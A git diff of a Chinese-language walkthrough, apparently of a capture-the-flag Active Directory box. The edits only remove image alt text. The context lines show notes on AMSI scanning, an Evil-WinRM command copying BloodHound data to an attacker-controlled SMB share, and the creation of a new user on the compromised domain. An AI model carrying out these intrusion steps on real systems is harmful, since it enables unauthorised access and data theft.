@@ -384,7 +384,7 @@ amsi工作原理：
   AmsiScanBuffer()
   AmsiScanString()
 
-<img src="../assets/img/old_imgs/image-20240718190144363.png" alt="image-20240718190144363" style="zoom:75%;" />
+<img src="../assets/img/old_imgs/image-20240718190144363.png" style="zoom:75%;" />
 
 
 
@@ -689,7 +689,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 > *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> copy 20240717234949_BloodHound.zip \\10.10.16.24\kali\20240717234949_BloodHound.zip
 
-用`bloodhound`分析,标记`svc-alfresco`为已取得的主机<img src="../assets/img/old_imgs/image-20240718181350999.png" alt="image-20240718181350999" style="zoom:75%;" />
+用`bloodhound`分析,标记`svc-alfresco`为已取得的主机<img src="../assets/img/old_imgs/image-20240718181350999.png" style="zoom:75%;" />
 
 创建一个新用户`test123`
 
